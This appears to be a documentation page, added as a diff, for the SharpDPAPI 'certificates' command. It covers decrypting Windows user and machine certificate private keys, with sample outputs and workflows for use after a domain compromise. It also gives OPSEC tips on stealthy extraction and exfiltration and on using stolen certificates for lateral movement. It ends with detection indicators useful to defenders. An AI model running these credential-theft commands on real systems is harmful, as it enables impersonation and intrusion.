@@ -1,0 +1,494 @@
+---
+title: 'certificates'
+description: 'Decrypt user and machine certificate private keys'
+icon: 'certificate'
+---
+
+## Overview
+
+The **certificates** command searches for and decrypts DPAPI-protected certificate private keys for users or machines. Recovered certificates can be used for authentication, code signing, or encrypting/decrypting data.
+
+<Info>
+  Windows stores certificate private keys encrypted with DPAPI. Decrypting these keys allows certificate export and usage without the original user context.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt user certificates with domain backup key
+SharpDPAPI.exe certificates /pvk:key.pvk
+
+# Decrypt with masterkey mappings
+SharpDPAPI.exe certificates {GUID1}:SHA1 {GUID2}:SHA1
+
+# Decrypt with CryptUnprotectData (unprivileged)
+SharpDPAPI.exe certificates /unprotect
+
+# Decrypt machine certificates
+SharpDPAPI.exe certificates /machine
+
+# Show all decrypted keys (not just linked to certificates)
+SharpDPAPI.exe certificates /pvk:key.pvk /showall
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="CryptUnprotectData">
+    ```bash
+    # Use Windows API for decryption (unprivileged)
+    SharpDPAPI.exe certificates /unprotect
+    ```
+
+    <Tip>
+      Works **without** masterkeys if run from the user context who owns the certificates. No LSASS access required!
+    </Tip>
+  </Tab>
+
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe certificates /pvk:key.pvk
+    ```
+
+    First decrypts user masterkeys, then uses them to decrypt certificate private keys.
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe certificates {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe certificates /mkfile:masterkeys.txt
+    ```
+
+    Directly uses pre-decrypted masterkeys for certificate decryption.
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe certificates /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe certificates /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe certificates /credkey:abc123...
+    ```
+  </Tab>
+</Tabs>
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FILE` | Target specific certificate private key file |
+| `/target:FOLDER` | Target specific folder of certificate files |
+| `/machine` | Use machine certificate store (requires elevation) |
+| `/showall` | Show all decrypted private keys, not just those linked to installed certificates |
+| `/cng` | Target CNG private keys instead of CAPI (default is CAPI) |
+| `/server:SERVER` | Triage remote server (not applicable for machine mode) |
+
+<Warning>
+  When using `/machine`, you need elevation. The `/mkfile` and `/target` arguments can be used with `/machine` triage.
+</Warning>
+
+## Certificate File Locations
+
+**User Certificate Private Keys (CAPI):**
+```
+%APPDATA%\Microsoft\Crypto\RSA\<USER-SID>\<RANDOM_FILENAME>
+```
+
+**User Certificate Private Keys (CNG):**
+```
+%APPDATA%\Microsoft\Crypto\Keys\<RANDOM_FILENAME>
+```
+
+**Machine Certificate Private Keys:**
+```
+C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\<RANDOM_FILENAME>
+C:\ProgramData\Microsoft\Crypto\Keys\<RANDOM_FILENAME>
+```
+
+## Execution Context
+
+<Tabs>
+  <Tab title="User Certificates">
+    - Run elevated to access all users
+    - Run unelevated for current user only
+    - Use `/unprotect` for unprivileged decryption
+  </Tab>
+
+  <Tab title="Machine Certificates (/machine)">
+    - **Requires elevation**
+    - Accesses machine certificate store
+    - Uses DPAPI_SYSTEM for decryption
+    - Targets system-wide certificates
+  </Tab>
+</Tabs>
+
+## Example: User Certificates with Masterkeys
+
+```bash
+SharpDPAPI.exe certificates {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB513717AA...
+```
+
+**Output:**
+```
+[*] Action: Certificate Triage
+
+Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104
+
+  File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}
+    Description      : CryptoAPI Private Key
+    algCrypt         : CALG_3DES (keyLen 192)
+    algHash          : CALG_SHA (32772)
+    Salt             : ef98458bca7135fe1bb89b3715180ae6
+    HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85
+    Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da
+
+    Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C
+    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+    Subject          : CN=harmj0y
+    Valid Date       : 2/22/2021 2:19:02 PM
+    Expiry Date      : 2/22/2022 2:19:02 PM
+    Enhanced Key Usages:
+        Client Authentication (1.3.6.1.5.5.7.3.2)
+         [!] Certificate is used for client auth!
+        Secure Email (1.3.6.1.5.5.7.3.4)
+        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
+
+    [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...
+-----END CERTIFICATE-----
+```
+
+<Tip>
+  Certificates with "Client Authentication" EKU can be used for authentication to systems and services. These are high-value targets!
+</Tip>
+
+## Example: Using /unprotect
+
+```bash
+SharpDPAPI.exe certificates /unprotect
+```
+
+**Output:**
+```
+[*] Action: Certificate Triage
+
+[*] Using CryptUnprotectData() for decryption.
+
+Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104
+
+  File               : f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {27db0044-e2aa-4ea2-b2c0-c469e9b29ed9}
+    Description      : Private Key
+    algCrypt         : CALG_AES_256 (keyLen 256)
+    algHash          : CALG_SHA_512 (32782)
+    Salt             : d7e1e00ed8a6249b5f05c487154e83cc0b51f71131530d0d46d3bfc63d890468
+    HMAC             : 4869f296cdcc964262a57e2efc4f2c5df57c2ed7319e297daa2107810da5c171
+    Unique Name      : {4A07001C-57BE-4E8B-86D1-43CACDF8D448}
+
+    Thumbprint       : BBD9B90FE1A4E37BD646CBC922ABE06C24C1E725
+    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+    Subject          : CN=harmj0y
+    Valid Date       : 10/18/2022 11:40:07 AM
+    Expiry Date      : 10/18/2023 12:00:07 PM
+    Enhanced Key Usages:
+        Client Authentication (1.3.6.1.5.5.7.3.2)
+         [!] Certificate is used for client auth!
+        Server Authentication (1.3.6.1.5.5.7.3.1)
+
+    [*] Private key file f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAxVEW49fMt...(snip)...
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIDKjCCAhKgAwIBAgIQYwhUr...(snip)...
+-----END CERTIFICATE-----
+```
+
+## Example: Machine Certificates
+
+```bash
+SharpDPAPI.exe certificates /machine
+```
+
+**Output:**
+```
+[*] Action: Certificate Triage
+[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+[*] RevertToSelf()
+
+[*] Secret  : DPAPI_SYSTEM
+[*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+[*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+
+[*] SYSTEM master key cache:
+
+{f12f57e1-dd41-4daa-88f1-37a64034c7e9}:3AEB121ECF2...(snip)...
+
+[*] Triaging System Certificates
+
+Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
+
+  File               : 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0
+
+    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+    Master Key GUID  : {f12f57e1-dd41-4daa-88f1-37a64034c7e9}
+    Description      : CryptoAPI Private Key
+    algCrypt         : CALG_3DES (keyLen 192)
+    algHash          : CALG_SHA (32772)
+    Salt             : aa8c9e4849455660fc5fc96589f3e40e
+    HMAC             : 9138559ef30fbd70808dca2c1ed02a29
+    Unique Name      : te-Machine-50500b00-fddb-4a0d-8aa6-d73404473650
+
+    Thumbprint       : A82ED8207DF6BC16BB65BF6A91E582263E217A4A
+    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
+    Subject          : CN=dev.theshire.local
+    Valid Date       : 2/22/2021 3:50:43 PM
+    Expiry Date      : 2/22/2022 3:50:43 PM
+    Enhanced Key Usages:
+        Client Authentication (1.3.6.1.5.5.7.3.2)
+         [!] Certificate is used for client auth!
+        Server Authentication (1.3.6.1.5.5.7.3.1)
+
+    [*] Private key file 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAzRX2ipgM1t9Et4KoP...(snip)...
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIFOjCCBCKgAwIBAgITVQAAAJqDK8j15...(snip)...
+-----END CERTIFICATE-----
+```
+
+## Certificate Usage Scenarios
+
+<AccordionGroup>
+  <Accordion title="Client Authentication">
+    **EKU:** `1.3.6.1.5.5.7.3.2`
+
+    - Used for user/computer authentication
+    - Can authenticate to Active Directory
+    - Access web services and APIs
+    - Remote desktop services
+    - **High value for lateral movement**
+  </Accordion>
+
+  <Accordion title="Code Signing">
+    **EKU:** `1.3.6.1.5.5.7.3.3`
+
+    - Sign executables and scripts
+    - Sign driver packages
+    - Create trusted applications
+    - Bypass application whitelisting
+  </Accordion>
+
+  <Accordion title="Secure Email">
+    **EKU:** `1.3.6.1.5.5.7.3.4`
+
+    - S/MIME email encryption
+    - Email signing
+    - Access encrypted email archives
+  </Accordion>
+
+  <Accordion title="Server Authentication">
+    **EKU:** `1.3.6.1.5.5.7.3.1`
+
+    - SSL/TLS server certificates
+    - Web server authentication
+    - Service authentication
+  </Accordion>
+
+  <Accordion title="Encrypting File System (EFS)">
+    **EKU:** `1.3.6.1.4.1.311.10.3.4`
+
+    - Decrypt EFS-encrypted files
+    - Access encrypted user data
+    - Recover encrypted documents
+  </Accordion>
+</AccordionGroup>
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain backup key:
+
+    ```bash
+    # 1. Retrieve backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Decrypt user certificates locally
+    SharpDPAPI.exe certificates /pvk:key.pvk
+
+    # 3. Decrypt machine certificates (requires elevation)
+    SharpDPAPI.exe certificates /machine
+
+    # 4. Decrypt on remote systems
+    SharpDPAPI.exe certificates /pvk:key.pvk /server:workstation.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Unprivileged Certificate Extraction">
+    Extract certificates from current user context:
+
+    ```bash
+    # No masterkeys or elevation needed
+    SharpDPAPI.exe certificates /unprotect
+
+    # Show all private keys, not just linked ones
+    SharpDPAPI.exe certificates /unprotect /showall
+    ```
+  </Accordion>
+
+  <Accordion title="Finding Authentication Certificates">
+    Look for certificates usable for authentication:
+
+    ```bash
+    # Decrypt all certificates
+    SharpDPAPI.exe certificates /pvk:key.pvk
+
+    # Look for output containing:
+    # "Certificate is used for client auth!"
+    ```
+
+    These can be used for:
+    - Kerberos authentication (PKINIT)
+    - Web service authentication
+    - Network service access
+  </Accordion>
+
+  <Accordion title="Machine Certificate Extraction">
+    Extract system certificates for service impersonation:
+
+    ```bash
+    # Requires elevation
+    SharpDPAPI.exe certificates /machine
+
+    # With domain backup key for specific target
+    SharpDPAPI.exe certificates /machine /target:C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\ /pvk:key.pvk
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Using Recovered Certificates
+
+The output provides both the private key and certificate in PEM format:
+
+<Steps>
+  <Step title="Save Output">
+    Save the private key and certificate sections to separate files:
+    - `cert.key` - Private key portion
+    - `cert.crt` - Certificate portion
+  </Step>
+
+  <Step title="Convert to PFX">
+    ```bash
+    openssl pkcs12 -export -out cert.pfx -inkey cert.key -in cert.crt
+    ```
+  </Step>
+
+  <Step title="Import Certificate">
+    Import the PFX to use for authentication or signing
+  </Step>
+</Steps>
+
+## Detection Considerations
+
+**Host-Based Indicators:**
+- Reading files from `%APPDATA%\Microsoft\Crypto\RSA\`
+- Access to `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\`
+- Non-standard processes accessing certificate private key files
+- Bulk enumeration of certificate stores
+- LSASS access for machine certificate operations
+
+**Defensive Monitoring:**
+- Monitor access to user crypto directories
+- Alert on MachineKeys folder access
+- Track certificate private key file reads
+- Detect bulk certificate enumeration
+- Monitor for certificate export operations
+
+**Event Log Indicators:**
+```
+Event ID: 4663 (File Access)
+Object Name: *\Microsoft\Crypto\RSA\*
+Object Name: *\MachineKeys\*
+Process Name: Not expected certificate applications
+```
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Includes user certificate triage
+  </Card>
+  <Card title="machinetriage" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinetriage">
+    Includes machine certificate triage
+  </Card>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Certificate Hunting">
+  - Look for "Client Authentication" EKU for authentication
+  - Check machine certificates on domain controllers and servers
+  - Code signing certificates are valuable for persistence
+  - EFS certificates can decrypt user files
+  - Smart card certificates are high-value targets
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Use `/unprotect` for unprivileged, stealthy extraction
+  - Target specific certificate files if locations are known
+  - Machine certificate operations require elevation (more visible)
+  - Redirect output to file to avoid console display
+  - Consider exfiltration method for recovered certificates
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No certificates found:**
+  - User may not have certificate private keys
+  - Try `/showall` to see all decrypted keys
+  - Check both CAPI and CNG locations
+  - Verify masterkeys are correct
+
+  **Certificate shows but no private key recovered:**
+  - Masterkey may not be available
+  - Try using domain backup key
+  - Certificate may use different DPAPI protection
+  - Check if `/cng` flag is needed
+
+  **Machine certificates require elevation:**
+  - Must run as Administrator or SYSTEM
+  - Uses DPAPI_SYSTEM LSA secret
+  - Cannot use /unprotect for machine certs
+</Accordion>
